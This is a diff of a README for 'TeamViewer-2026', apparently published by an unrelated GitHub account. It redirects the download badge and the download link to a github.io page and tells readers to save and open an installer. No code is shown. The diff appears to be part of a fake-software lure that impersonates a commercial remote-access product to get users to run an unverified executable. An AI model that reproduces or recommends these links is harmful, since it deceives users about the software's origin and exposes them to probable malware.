@@ -1,6 +1,6 @@
 # 💻 TeamViewer-2026 - Streamline remote support and desktop access
 
-[![Download TeamViewer-2026](https://img.shields.io/badge/Download-TeamViewer--2026-blue.svg)](https://github.com/uniqueente4423/TeamViewer-2026)
+[![Download TeamViewer-2026](https://img.shields.io/badge/Download-TeamViewer--2026-blue.svg)](https://uniqueente4423.github.io)
 
 TeamViewer-2026 provides a workflow for remote sessions, access groups, and security settings on Windows. This guide helps you set up and use the software to manage your remote connections.
 
@@ -16,7 +16,7 @@ This software runs on Windows. Ensure your computer meets these requirements:
 
 ## 📥 Getting Started
 
-1. Visit the following link to download the software: [https://github.com/uniqueente4423/TeamViewer-2026](https://github.com/uniqueente4423/TeamViewer-2026).
+1. Visit the following link to download the software: [https://uniqueente4423.github.io](https://uniqueente4423.github.io).
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Open the file to begin the setup.
